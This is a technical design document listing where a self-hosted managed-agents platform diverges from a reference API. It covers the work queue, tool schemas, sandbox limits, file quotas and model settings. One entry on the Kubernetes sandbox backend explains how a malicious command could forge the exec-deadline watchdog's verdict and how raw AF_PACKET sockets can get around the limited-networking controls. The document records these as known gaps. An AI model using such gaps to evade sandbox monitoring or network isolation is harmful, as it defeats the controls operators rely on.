managed-agents/self-hosted-sandboxes ("Anthropic enqueues the session as a work item"; the worker "spawns an execution context for each one … runs the tool calls") and api/beta/environments/work poll and retrieve (the same "queued when sessions are created" sentence, which the list page does not carry; `data` documented as the session arm alone on all three), fetched 2026-08-23; the BetaSelfHostedWork doc comment, Data typed BetaSessionWorkData, the unreferenced BetaHealthCheckWorkData (checked against anthropic-sdk-go v1.70.1 — betaenvironmentwork.go BetaSelfHostedWork and BetaSelfHostedWork.Data and BetaHealthCheckWorkData), DefaultMaxIdle 60s, an unowned tool name gets no result, mcp_tool_use left to the server (checked against anthropic-sdk-go v1.70.1 — betasessiontoolrunner.go DefaultMaxIdle and SessionToolRunner.execute and SessionToolRunner.streamLoop), ack on yield (checked against anthropic-sdk-go v1.70.1 — poller.go WorkPoller.Next) and Run's one-item-at-a-time loop, handleItem's runner exiting on ErrSessionTerminated/ErrIdleTimeout, then force-stopping (checked against anthropic-sdk-go v1.70.1 — worker.go EnvironmentWorker.Run and EnvironmentWorker.handleItem), anthropic-cli's usage line and --on-work data.type guard (checked against anthropic-cli v1.30.0 — worker.go workerPollCommand and newOnWorkRunner); internal/queue/queue.go (the five Kind constants and the Claim/Poll split, Enqueue's live-item dedup), internal/store/migrations/0001_init.sql (work_items.session_id NOT NULL), internal/queue/lifecycle.go (workAPIScope), internal/queue/stats.go (depth counts unreserved queued rows, environment-wide), internal/api/workapi.go (workData, toWire, pollWork, and stopWork's re-arm), internal/api/sessions.go (the model_turn enqueued only for a non-empty initial_events) and internal/api/events.go (startWorkCycle, which a message under way does not reach), internal/brain/brain.go (escalate to ToolExec on a runnable agent.tool_use; the askIDs gate that enqueues nothing), internal/executor/drain.go (settleDrain, which chains a tool_exec past a web or MCP pass), internal/worker/lease.go (the worker's own force-stop after its drain); docs/HISTORY.md and docs/history/2026-07.md (the real-`ant beta:worker` acceptance records); managed-agents-wire-recordings at 16d24be (every `claimed work` line; no `healthcheck` outside 2026-09-12/platform-open-issues.json); CLAUDE.md "Core architecture"* One thing the queue's contents are recorded to protect, and since #546 do here too: the reference refuses `DELETE /v1/environments/{id}` on a `self_hosted` environment that still holds queued work — "Either archive the environment first to allow the queue to drain, or use force=true to delete immediately" — and this platform now answers the same 409 in the same sentence; what `force=true` lifts here, and what it cannot, is the `DELETE /v1/environments/{id} — the self-hosted queue refusal and force=true` entry below. *Tracked: #78 (what the reference's own poll hands out — whether `data` ever carries a non-session arm, and whether one session ever produces more than one item there); landed for #457.*
- **GET /v1/environments/{id}/work/poll — block_ms** — **Converged, no longer a divergence (#74).** The poll now long-polls as the reference's does: an empty poll subscribes to a `map_work_items` NOTIFY (fired by `queue.Enqueue` on the enqueuer's own handle — commit-delivered inside a transaction — keyed by environment id) and is held open until work arrives, the window lapses, or the client disconnects, with a final re-poll at the deadline because a wake can race the timer. The window semantics follow the SDK's recorded contract: absent means non-blocking, the server caps the window at 999ms (our over-cap values clamp to that ceiling), and an explicit 0 is rejected — non-blocking is expressed by omission ("the server caps this at 999" and "the server rejects an explicit 0", checked against anthropic-sdk-go v1.70.1 — poller.go pollBlockMillis and WorkPollerOptions.BlockMs). Two edges are our reading rather than the record's: the clamp itself, for a client that actually sends more than 999 (the reference client's default sends exactly 999, and a caller-configured BlockMs is forwarded unvalidated but unrecorded against the real server — so whether it clamps or rejects an over-cap value is unknown; the strictest reading of the param doc's "Must be 1-999" would reject, and a value too large for a machine integer does take our 400 path rather than the clamp), and extending the 0-rejection to negative, present-but-empty (`?block_ms=`, which is not omission), unparseable, and repeated values — the reference's exact answer for all of these is unrecorded, so the refusal keeps this platform's words. Its sibling on the same route is recorded: `reclaim_older_than_ms=0` beside a valid `block_ms` is 400 `reclaim_older_than_ms: Input should be greater than or equal to 1` (2026-09-02 batch2 #352 `work.poll.requeued-item`), which refutes the reading that parameter was an unvalidated knob; since #842 a value under 1 takes that sentence here, before the poll is recorded, an absent or empty one is still the 5000ms default, a repeated one is refused in our words as `block_ms`'s is (unrecorded), and an over-large one — one past any machine integer included, which pydantic's unbounded integers would take — is clamped, ours. Availability that arrives without an enqueue (a lapsed reservation or lease reclaim) has no NOTIFY and is discovered by the next poll, at most one ≤999ms window late; the worker's `EmptyPollSleep` deliberately stays on top, because the reference client sleeps between empty polls the same way. **This entry replaces the one recording the non-blocking poll** — "block_ms is accepted but the poll is non-blocking (returns immediately) … True long-poll on a work_items NOTIFY is deferred" — corrected rather than deleted so the convergence stays auditable. *Evidence: internal/api/workapi.go (pollWork, blockWindow, reclaimWindow), internal/queue/queue.go (Enqueue's NotifyWorkEnqueued), internal/events/log.go + broker.go (channelWork); internal/api/workapi_test.go TestWorkPollBlockMs\* and TestWorkPollRefusesAReclaimWindowUnderOne, internal/queue/queue_test.go TestEnqueueNotifiesWorkChannelOnCommit; the BlockMs contract (checked against anthropic-sdk-go v1.70.1 — poller.go WorkPollerOptions.BlockMs)* *Tracked: #78 (a recording would settle whether the reference clamps or rejects an over-cap block_ms, and what it answers to a negative, empty, unparseable or repeated value); landed for #74 and #842.*
- **Work-item identity — a fresh `work_` id per re-hand-out** — The wire carries no ownership proof — no generation/version field on the work object, stop's body `{force}` only — so re-offering the same id let a hung-then-revived worker's force-stop land on the *replacement's* reclaimed item and re-strand the session. This platform rotates the identity instead: `queue.Poll` mints a new `work_` id on every re-offer — the lapsed un-acked reservation and the dead-worker `starting`/`active` reclaim — so a stale worker's ack, heartbeat and stop 404 on an id that no longer exists, not the live item. A 404 stop is logged against the session (its work id unresolvable by then) and dropped, and a 404 ack is dropped as an empty poll — routine hand-off, not an error that escalates the backoff. A 404 heartbeat is safe only through the stop: the worker cancels the run and, as the reference worker does, force-stops under the same id (#813), which 404s in turn. A reference-shaped worker reading it as an ordinary error stays correct: its poller force-stops the unackable item **under the id it was handed** (`discardUnprocessable`), which the rotation neutralizes. The **first** hand-out keeps its enqueue-minted id (the one `lease_expires_at IS NULL` case), so the ordinary lifecycle is id-stable as the reference's; the row carries over unchanged (metadata, trace context, `created_at`), ids are opaque, and no wire field, status or shape changes. The `starting`/`active` reclaim also re-stamps `started_at`, by analogy with the reference's recorded same-id re-queue (*BetaSelfHostedWork — unreached lifecycle timestamps render null*); a lapsed un-acked reservation keeps it, never having left the queue. Two observable deltas, both of a kind any page over a live queue already carries: a client holding a lapsed hand-out's id must re-poll rather than reuse it; and because `ListWork` pages on a descending `(created_at, id)` keyset, an item that rotates between pages can be returned **twice** when its new id sorts below the cursor's (it ties itself on `created_at`, so no second row need tie), or skipped when its `created_at` ties and the new id sorts above. Whether the reference rotates is unrecorded — an earlier revision of this entry called the race a limitation the reference shares, withdrawn as unevidenced: the typed schema shows only that no proof is *exposed*, not what its reclaim does; ours does, deliberately. The cloud executor's `Claim` needs no equivalent — `Item.Lease` equality is already an ownership proof. *Evidence: internal/queue/queue.go Poll (`SET id = CASE WHEN t.lease_expires_at IS NULL …`; its comment holds the derivation cut here) and internal/worker/lease.go (pollAck, heartbeat, forceStop); internal/queue/lifecycle_test.go TestEveryReHandOutMintsAFreshWorkIdentity, internal/worker/lease_test.go TestStaleWorkerStopCannotStrandTheReplacement and TestWorkerRejectedBeatOnAReissuedIDLeavesTheReplacementAlone; no generation field, `{force}`-only stop body (checked against anthropic-sdk-go v1.70.1 — betaenvironmentwork.go BetaSelfHostedWork and BetaSelfHostedWorkStopRequestParam) and discardUnprocessable (checked against anthropic-sdk-go v1.70.1 — poller.go WorkPoller.discardUnprocessable); docs/history/2026-07.md § "work API — the work-item lifecycle: get / ack / heartbeat / stop (slice 8, second part)" (the original wire-settled finding)* *Tracked: #78 (a recording would settle whether the reference rotates, and what its reclaim does to `started_at`); landed for #62.*
- **Work item `id` — a `work_` id here, the session's id there (confirmed 2026-09-02 and 2026-09-19, #78)** — Every recorded work body's `id` is its session's id, the `sesn_…` its own `data.id` carries (all 61 bodies of *BetaSelfHostedWork — the recorded `actor` key, rendered null*), and the reference's refusals name the item by it ("Work item sesn_… must be in QUEUED state to acknowledge"). This platform mints a `work_` id per item, the form the SDK's field comment gives ("Work identifier (e.g., 'work\_...')", checked against anthropic-sdk-go v1.70.1 — betaenvironmentwork.go BetaSelfHostedWork.ID), because a session here holds a series of items, one live at a time (*Work items (poll / get / list / stats)*), and a re-hand-out takes a fresh id (*Work-item identity*); a session id could tell neither apart. #680 decided to keep it for those two reasons. A client that addresses the item by its `id` and the session by `data.id`, as the SDK's worker and `ant` do, is unaffected; one that reads the session off the `id` is not. *Evidence: managed-agents-wire-recordings 2026-09-02/FINDINGS.md ("`id` == the session id (`sesn_…`), no `work_` prefix") and the 61 recorded bodies; internal/queue/queue.go EnqueueThread and PollOn (the `work_` mints); internal/api/workapi_test.go TestWorkPollReturnsWireShape (the `work_` prefix, pinned).* *Tracked: #78 (whether the reference's work `id` is ever other than its session's); the decision to keep it landed for #680.*
- **BetaSelfHostedWork — the recorded `actor` key, rendered null (confirmed 2026-09-02 and 2026-09-19, #78; aligned for #680)** — **Converged, no longer a divergence (#680).** Every work body the recordings hold has 14 keys, the typed schema's 13 and `"actor": null`: 61 bodies, 11 in 2026-09-02's `batch2.json` and 50 in the four 2026-09-19 sets' `worker-network.json`, across stop, poll, ack, list and GET, and none carries any other value. The SDK's struct and the spec it is generated from have the 13 and no `actor` (absent at anthropic-sdk-go v1.70.1 — betaenvironmentwork.go BetaSelfHostedWork.Actor, and absent at anthropic-sdk-go v1.70.1 — spec components.schemas.BetaSelfHostedWork.properties.actor). The entry this replaces recorded the opposite: `toWire` rendered those 13 and left the key out, because no typed field reads it and nothing says what it holds when it is not null. #680 decided for the recording, so `toWire` now renders `"actor": null` on every work surface — poll, list, GET, metadata update, ack and stop — and a work body here has the recorded 14 keys. Five of those six are recorded surfaces. The sixth, the metadata update (`POST …/work/{work_id}`), appears in the recordings only as two 403s refusing the environment key, so no recorded body comes from it: the update renders `actor` here because all six share `toWire`, and **that the reference's update answer carries the key too is an inference**, extrapolated from the other five. A typed client finds the key on both sides only under `JSON.ExtraFields`, where the SDK files a key it does not model (checked against anthropic-sdk-go v1.70.1 — betaenvironmentwork.go BetaSelfHostedWork); `ant`, which prints the raw body, shows it on both (checked against anthropic-cli v1.30.0 — betaenvironmentwork.go handleBetaEnvironmentsWorkRetrieve). What survives is the constant: the null is written, not derived, so a reference body that ever carried a value would differ again. *Evidence: managed-agents-wire-recordings 2026-09-02/FINDINGS.md ("extra `actor:null` field not in the SDK") and `batch2.json` (whose `work.update.metadata` and `work.update.no-metadata`, both 403, are the update route's only appearances), `2026-09-19-self-hosted-latest-cli/worker-network.json` idx 2 (a stop's 14-key body) and the other three sets' `worker-network.json`; internal/api/workapi.go workWire; internal/api/workapi_test.go wantWorkKeys (the 14 keys, on every surface); internal/worker/lease_test.go TestSDKTypedStopDecodesTheWorkObject (the null under `JSON.ExtraFields`).* *Tracked: #78 (whether `actor` ever carries a value, and what, and whether the reference's metadata-update answer carries it as the five recorded surfaces do); landed for #680.*
- **traceparent to the BYOC worker — storage and transport** — The turn's trace context is stored in a dedicated trace_context jsonb column on work_items (migration 0005) — diverging from the plan's sketch of riding work-item metadata, because metadata is now client-updatable (PR C-meta) — and emitted as traceparent/tracestate response headers on /work/poll, never in the wire work body. The reference worker ignores unknown headers; ours reads them. Additive, wire-compatible surface. *Evidence: docs/history/2026-07.md § "work API — environment-key auth + `/work/poll` (slice 8, first part)", docs/history/2026-07.md § "BYOC worker — `traceparent` propagation across the process boundary (slice 8, PR C2b-2)" (PR C2b-2, 'Why a column, not metadata')*
- **GET /v1/environments/{id}/work/stats — provenance** — BetaSelfHostedWorkQueueStats is a derived view over Postgres (depth/pending/oldest_queued_at from the work_items snapshot; workers_polling from a poll-time worker-id record, migration 0006, 30-second window), not Redis Streams consumer-group figures. The SDK's field docs are Redis-native (depth = lag, pending = PEL, workers_polling = consumers), all but confirming the reference queue is Redis Streams; same wire numbers, Postgres provenance. Interpretation baked in: the wire's 'acknowledged' is our Ack (queued->starting), so depth = queued items available (no reservation or lapsed lease) and pending = polled-but-not-acked. *Evidence: docs/history/2026-07.md § "work API — the queue-stats endpoint (slice 8, PR C-stats)" ('Divergence noted: same wire numbers, Postgres provenance'); anthropic-sdk-go field docs cited there*
- **Helm chart (deploy/helm/managed-agent-platform) — plan-sketch divergences** — Postgres ships inline (StatefulSet, toggleable to externalDatabase.url) rather than as a subchart: an external chart-repo dependency undercuts air-gap self-hosting. The BYOC worker is intentionally out of the chart. **The gVisor RuntimeClass deferral is closed (#65):** the K8s provider now sets `runtimeClassName` on sandbox pods from `SANDBOX_K8S_RUNTIME_CLASS`, so the chart wires it as `sandboxRuntimeClass.name`, with an opt-in `sandboxRuntimeClass.create` that also creates the cluster-scoped RuntimeClass object (off by default — a cluster-scoped object collides between releases, needs cluster-scope RBAC to install, and needs the nodes already running the handler; it is Helm-managed, so `helm uninstall` removes it). *Evidence: internal/sandbox/k8s/k8s.go (podSpec's RuntimeClassName, runtimeClassName), internal/sandbox/k8s/hardening_test.go TestPodSpecRuntimeClass, deploy/helm/managed-agent-platform/templates/sandbox-runtimeclass.yaml; docs/history/2026-07.md § "Kubernetes sandbox provider (slice 9)"*

- **bash tool description — ours, and deliberately no longer the SDK's string** — The six sandbox tools' model-facing **schemas** are the SDK Input types' field for field — where the recorded reference's differ, the entry on them below says how; their **descriptions** are this platform's prose, but for grep's, which is the recorded reference's since #827 (the next entry), and read/write/grep's never matched the SDK's client-side toolset text. `bash` was the one that still matched the SDK's `bashTool.Description()` verbatim, and no longer does: it now also tells the model to redirect a backgrounded process's output. The reason is behavioural rather than cosmetic — a backgrounded process inherits the exec's output stream and holds it open after the command itself exits, costing roughly two seconds per call while the daemon force-closes it (#65). What the reference's *server-side* toolset puts in front of the model went unobserved until a 2026-09-02 recording echoed it, and its `bash` description is neither the SDK's string nor ours — so matching the SDK's client-side string was never evidence of matching it; the schema, which is what a tool call is validated against, is untouched by this change (#822 later closed it, the next entry). *Evidence: internal/toolset/definitions.go (the bash entry and its comment); the SDK string this no longer matches (checked against anthropic-sdk-go v1.70.1 — bash.go bashTool.Description), the descriptions that already differed (checked against anthropic-sdk-go v1.70.1 — fs.go BetaReadTool and BetaWriteTool; checked against anthropic-sdk-go v1.70.1 — search.go BetaGrepTool)*
- **The six sandbox tools' model-facing schemas — the SDK's Input types, closed as the recorded reference closes them** — Our six sandbox schemas are the SDK's typed Input types, field for field (checked against anthropic-sdk-go v1.70.1 — betaagent.go BetaManagedAgentsAgentToolset20260401BashInput and BetaManagedAgentsAgentToolset20260401EditInput). The 2026-09-02 recording that settled the web tools echoed these six too, and two of its keywords are adopted (the owner's decision on #822): all six are closed with `additionalProperties: false`, and `edit`'s `old_string` carries `minLength: 1`, the floor the edit tool already held. Like the web tools' keywords, both reach the model on the anthropic path, and the OpenAI adapter strips them from every built-in (#682). The closed schema is enforced on both: each of the six refuses a property its schema does not declare with a tool error naming it and the properties the tool accepts, rather than dropping it and running a different call (the owner's decision on #827, on the executor and the BYOC worker alike); what the reference answers to one is unrecorded. The rest differs on purpose, by the #822 decision. The reference's `bash` takes `command` alone, required, with no `restart` or `timeout_ms`, and its `edit` has no `replace_all`: ours keep the extra fields because they come from the SDK's typed Input types, so a reference client may send them and our tools honour them, and ours leave `command` optional because the SDK's own field comment omits it on a restart. Its `read`, `write` and `edit` put `"pattern": "^\\/.*"` on `file_path`, admitting absolute paths only; ours stay relative, because the Level-1 skills block points the model at `skills/<dir>/SKILL.md`, which that pattern would call invalid. And the echo shows more that ours keep as the SDK's: `read`'s `view_range` is a bounded two-integer `prefixItems` tuple, and five of the six tool descriptions differ. `grep` converged instead (#827): its schema is the echo's, its twelve properties beyond the SDK's two (`type`, `glob`, `output_mode`, `-n`, `-A`, `-B`, `-C`, `context`, `-i`, `head_limit`, `offset`, `multiline`) with their types, `output_mode`'s enum and every property description word for word — and grep hands each to rg as the flag its description names (the implementation-strategy entry above) — and so is its tool description, the one of the six that is the reference's, because the reference's describes ripgrep and grep now is ripgrep (the INFERRED grep entry settles the one reading of it the echo leaves open). The caveat is the web tools' entry's: a model-mediated echo, not a captured provider request. *Evidence: internal/toolset/definitions.go (the six sandbox entries; TestToolSchemasMatchTheWire, TestSandboxToolSchemasCarryTheAdoptedRecordedKeywords, TestGrepSchemaMatchesTheRecording, TestGrepDescriptionMatchesTheRecording); internal/toolset/toolset.go unknownProperties (TestUnknownInputPropertiesAreRefused, TestSchemaPropertiesAreWhatEachToolDecodes, which holds each schema to the fields its tool decodes, and on each deployment point internal/executor's TestToolInputPropertiesOnTheExecutorPath and internal/worker's TestToolInputPropertiesOnTheWorkerPath); internal/modelgateway/convert/tools.go strippedKeywords, which internal/provider/openai applies (TestBuiltinToolParametersLoseFormatMinLengthAndAdditionalProperties) and internal/provider/anthropic's raw pass-through (TestGenerateBuiltinToolSchemaConstraintsReachTheWire); internal/brain/skills.go renderSkillsBlock (the relative skill path)* *Recording: managed-agents-wire-recordings 2026-09-02/batch2.json, probe `sessA.events.after-turn2`.* *Landed for #822 and #827.*

- **Sandbox process limit — Docker only, because Kubernetes has no per-pod one** — `sandbox.Hardening.PidsLimit` (default 512) is applied by the Docker backend as `HostConfig.PidsLimit` and **ignored** by the Kubernetes backend: the Pod API defines no pids resource — a per-pod process cap is the kubelet's `podPidsLimit` node setting, not a pod-spec field (k8s.io/api v0.36.2 `core/v1` has no such `ResourceName`; a pod under a 500m CPU limit on kind reads `/sys/fs/cgroup/pids.max` as the node default, measured). The alternative — failing `Provision` on Kubernetes whenever a pids limit is configured — was rejected: the platform default is on, so it would break every Kubernetes deployment out of the box for a control the cluster expresses elsewhere. The asymmetry is therefore structural in the test suite rather than hidden: the shared contract's pids row is registered only for a backend declaring `Harness.EnforcesPidsLimit`, and `TestPodSpecIgnoresPidsLimit` pins the Kubernetes side as deliberate. Every other hardening dimension the suite can observe from inside a sandbox — CPU, capability drops, non-root, read-only rootfs — is asserted for both backends by the same shared rows; the memory cap is asserted at the provider level only, since observing it means being OOM-killed (plan 19 decision 6). Operators are pointed at `podPidsLimit` in docs/self-hosted-security.md §3. *Evidence: internal/sandbox/hardening.go (Hardening.PidsLimit doc), internal/sandbox/k8s/k8s.go (resourceRequirements), internal/sandbox/k8s/hardening_test.go TestPodSpecIgnoresPidsLimit, internal/sandbox/sandboxtest/contract.go (HardeningCapsProcesses registration), internal/sandbox/k8s/k8s_test.go (the harness comment)*
- **Sandbox disk cap — Kubernetes only, because Docker cannot enforce one honestly** — `sandbox.Hardening.EphemeralStorageBytes` (default 0, off) is applied by the Kubernetes backend as an `ephemeral-storage` limit *and* an equal request, and **ignored** by the Docker backend, which warns once per provider that the cap is unenforceable. Mirror of the pids row above, different cause: the Engine API *does* define `HostConfig.StorageOpt`, so this is not an absent field but one whose enforcement is conditional on the daemon's storage driver — some enforce it, some refuse the option outright, and Docker Desktop's `overlayfs` accepts it and enforces nothing at all (only the last is measured here; the rest are documented) — so the platform reports no cap it cannot vouch for. Failing `Provision` when it is set was rejected, the pids entry's reason inverted: this knob is off by default, so an operator who set it should be told it did nothing, not lose their executor. It is opt-in on Kubernetes for a sharper version of the memory cap's reason: a CPU or memory bound throttles or kills the process, this gets the whole **pod evicted** by the kubelet, taking the session's sandbox with it mid-call. Nor is the Kubernetes half unconditional: the kubelet applies the limit only on the node layouts whose local ephemeral storage it can measure, and on any other "does not apply resource limits for ephemeral local storage" — the pod accepts the fields and exceeds them unevicted (kubernetes.io/docs/concepts/storage/ephemeral-storage). Request equals limit deliberately — the kubelet ranks eviction candidates by usage against the *request*, so a limit the scheduler never reserved would land enforcement on an arbitrary pod rather than the one that filled the disk. No shared contract row: nothing inside a sandbox can observe this cap, so both backends assert it at the provider level (plan 19 decision 6, as for memory). *Evidence: internal/sandbox/docker/docker.go — the `warnUnenforceableEphemeralStorage` comment carries the storage-driver derivation and the measured no-op this row no longer restates — `docker run --rm --storage-opt size=1G alpine:3 df -h /` exits 0 and still reports the full host disk (docker 29.6.2/overlayfs, 2026-08-01); internal/sandbox/hardening.go (EphemeralStorageBytes doc); internal/sandbox/k8s/k8s.go resourceRequirements; internal/sandbox/k8s/ephemeral_test.go TestPodSpecAppliesEphemeralStorage; internal/sandbox/docker/ephemeral_test.go TestSandboxConfigIgnoresEphemeralStorage; internal/sandbox/sandboxtest/contract.go Harness; docs/self-hosted-security.md §3, the operator-facing version (the drivers by name, and the node layouts the kubelet can measure)* *Landed for docs/plan/20_gcp-deployment.md slice 2.*
- **K8s sandbox backend — deadline and limited-networking fidelity vs Docker** — Two documented necessity divergences from the Docker backend's guarantees: (1) the exec-deadline verdict reads state on the sandbox's own filesystem (Kubernetes has no out-of-band exec handle), so a malicious command can tamper with it in both directions — overwriting the pid file after killing its watchdog hides an overrun, provided the command is still running when Exec gives up on it or kills the wrapper so that nothing records how long it ran; and writing its own exit line with a long run time — no kill mark or SIGKILL needed — or writing the watchdog's kill mark and contriving a SIGKILL claims a timeout it never hit (the mark and the wrapper's run-time record are what classify a punctual kill, a SIGKILL past the deadline that the watchdog did not deliver, and an overrun that exited, here, since the liveness probe is itself an exec and answers a round trip late — #95, #110, #832, #838). Out of scope for single-tenant v1: honest runaways forge nothing, every term of the verdict only ever *adds* a timeout so a forged mark or record cannot withdraw one, and a forged timeout mislabels only the tenant's own tool call. Docker keeps no such in-pod state — its probe is a daemon call the sandbox cannot reach — and deliberately still does not; (2) the limited-networking route flush is not equivalent to NetworkMode none on every cluster (raw AF_PACKET sockets can reach the segment; only the main IPv4 table is inspected, so policy-routing CNIs and IPv6 need the egress-gate sidecar — shipped as the plan-12 `executor.gateImage` opt-in, whose owner-match firewall replaces the flush on gated pods; the caveat still holds for deployments that leave the gate off). *Evidence: docs/history/2026-07.md § "Kubernetes sandbox provider (slice 9)"*

- **POST /v1/files — per-organization storage quota not enforced** — The public docs cap uploads at 500 MB per file *and* total storage at 1 TB per organization, refusing an upload with a 400 "Storage limit exceeded" once the organization reaches it — 1 TB now, where docs/plan/08_files.md decision 4 recorded 500 GB. The per-file cap is honored: `maxFileBytes` is `500 << 20` bytes (500 MiB, the binary reading of "500 MB"), a 413 past it. No per-organization quota is enforced at any size, deliberately — a self-hosted operator owns its own disk, and imposing a fixed ceiling on a single-tenant deployment would be arbitrary — so neither the 1 TB figure nor its 400 has anything here to answer. The documented filename validation (1–255 chars, no `<>:"|?*\/` or control chars) is enforced. *Evidence: docs/plan/08_files.md decision 4; platform.claude.com/docs/en/build-with-claude/files ("File storage and limits" and "Error handling", re-read 2026-10-02); internal/api/filesupload.go maxFileBytes* *Tracked: #55 (delivered; plan 08's Files API).*

- **Agent model effort — explicit selection honored; defaults and capabilities delegated to the configured endpoint (plan 53)** — The former silent drop is fixed: string and `{type: level}` inputs normalize to the response object for `low|medium|high|xhigh|max`; malformed selections return 400; agent updates omitting effort retain the saved level only when the model ID stays the same; a new ID resets to its own default. A session model override replaces the model config, while omitting the model inherits the pinned agent's selection. The [public agent guide](https://platform.claude.com/docs/en/managed-agents/agent-setup) (read 2026-09-22) specifies the same-ID condition and says the reference ignores session-level effort; honoring an explicit session override here is a deliberate extension that avoids silently discarding the caller's selection. Primary, child and grader turns forward the level as Anthropic `output_config.effort` or OpenAI-compatible `reasoning_effort`. For backend defaults and capabilities, two deliberate differences remain: the reference resolves a per-model default at save time and always returns effort, whereas an unset platform effort stays absent and delegates to the upstream; the reference rejects unsupported model/effort pairs at creation, whereas this platform validates the level but leaves model-specific support to its configured endpoint. Client-facing model IDs may route to arbitrary upstream models, so a hard-coded Anthropic capability table would be misleading. An upstream rejection remains a visible model-request failure; protocol compatibility does not prove that an endpoint implements effort. *Evidence: checked against anthropic-sdk-go v1.70.1 — betaagent.go BetaManagedAgentsModelConfigParams.Effort and BetaManagedAgentsModelConfigEffortUnion; checked against anthropic-sdk-go v1.70.1 — message.go OutputConfigParam.Effort; checked against anthropic-sdk-go v1.70.1 — betasession.go BetaManagedAgentsAgentWithOverridesParams.Model; [OpenAI Chat Completions reasoning_effort](https://developers.openai.com/api/reference/resources/chat/subresources/completions/methods/create) (read 2026-09-22); internal/domain/agent.go, internal/api/agents.go, internal/brain/brain.go and grader.go, internal/provider/anthropic and openai. Landed for #160.*

- **Agent model `inference_geo` — protocol metadata, without geographic enforcement (plan 54)** — The user chose protocol compatibility for a deployment using operator-configured geography (2026-09-22). The optional string accepts `us` or `global`, persists through agent versions and session/roster snapshots, and echoes the caller's selection. Null means unset and is omitted from responses; invalid selections, including empty strings, return 400. Omitting the whole model preserves it; supplying a replacement model without the field clears it. Legacy snapshots omit the field. Unlike the reference, this metadata is not passed to either provider protocol and does not select a region. No workspace default/allowlist, per-model capability check or roster-wide matching-geo requirement is applied; actual inference geography is determined by the operator's deployment and upstream configuration, and a returned value is not proof of where inference ran. A supporting upstream could enforce a forwarded constraint, but the user explicitly excluded that behavior from scope. *Evidence: checked against anthropic-sdk-go v1.70.1 — betaagent.go BetaManagedAgentsModelConfigParams.InferenceGeo and BetaManagedAgentsModelConfig.InferenceGeo; checked against anthropic-sdk-go v1.70.1 — message.go MessageNewParams.InferenceGeo; [agent guide](https://platform.claude.com/docs/en/managed-agents/agent-setup#pin-the-inference-geo) and [session guide](https://platform.claude.com/docs/en/managed-agents/sessions#pin-the-inference-geo-for-a-session), read 2026-09-22; internal/domain/agent.go; docs/plan/54_inference-geo-wire.md. Landed for #433.*


- **Work items — `secret` is the sessions token's envelope on the poll of a store session, null everywhere else (plan 36 slice 5, decision 15)** — `BetaSelfHostedWork` carries a required `secret` (since anthropic-sdk-go v1.59.0 — betaenvironmentwork.go BetaSelfHostedWork.Secret), "may be populated when polling for work; null on all other retrieval paths", and the reference worker decodes it (checked against anthropic-sdk-go v1.70.1 — worker.go sessionsTokenFromSecret): URL-safe base64, padded or not, of a JSON object whose `sessions_token` key becomes the Bearer for that item's lease heartbeat, force-stop, `GET /v1/sessions/{id}`, the session's events list/stream/send, the skill reads and every memory call, with the parent client's `X-Api-Key` deleted so the two credentials never ride together; an absent or undecodable payload logs a warning and falls back to the environment key, and a session with stores and no token **fails the whole work item** (`ErrSessionMemoryNoToken`). This platform renders `base64url(JSON {"sessions_token": "wtk_…"})` on the poll response of an item whose session attaches a memory store — minted per claim, hash-only at rest — and `null` on every other path and for every other item, so a storeless BYOC session is byte-for-byte what it was. The reference's envelope carries further keys the worker does not consume (`session_ingress_token`, `auth[]` in the SDK's fixture); they are absent here, and #165's vault-credential bundle would be one more key in the same envelope. What is confirmed is the envelope and the worker's use of it; whether the reference populates `secret` always or only for store sessions, and its other keys, are the INFERRED entry below. **This entry replaces one that read "`secret` rendered, always null"** — true of a worker that never read the field (checked against anthropic-sdk-go v1.63.1 — worker.go EnvironmentWorker.handleItem) and false of one that does (since anthropic-sdk-go v1.66.0 — worker.go sessionsTokenFromSecret) — rewritten rather than deleted so the reversal stays auditable. *Evidence: checked against anthropic-sdk-go v1.70.1 — betaenvironmentwork.go BetaSelfHostedWork.Secret; the decode, the per-item credential and the X-Api-Key delete, and the failure on stores without a token (checked against anthropic-sdk-go v1.70.1 — worker.go sessionsTokenFromSecret and EnvironmentWorker.handleItem; checked against anthropic-sdk-go v1.70.1 — poller.go helperReqOpts and bearerReqOpts; checked against anthropic-sdk-go v1.70.1 — memories.go ErrSessionMemoryNoToken); no occurrence of "secret" in the worker, what the replaced entry rested on (checked against anthropic-sdk-go v1.63.1 — worker.go EnvironmentWorker.handleItem); internal/worktoken (Secret, Mint), internal/api/workapi.go claimWork; docs/plan/36_memory-stores.md decisions 6 and 15* *Tracked: #165.*
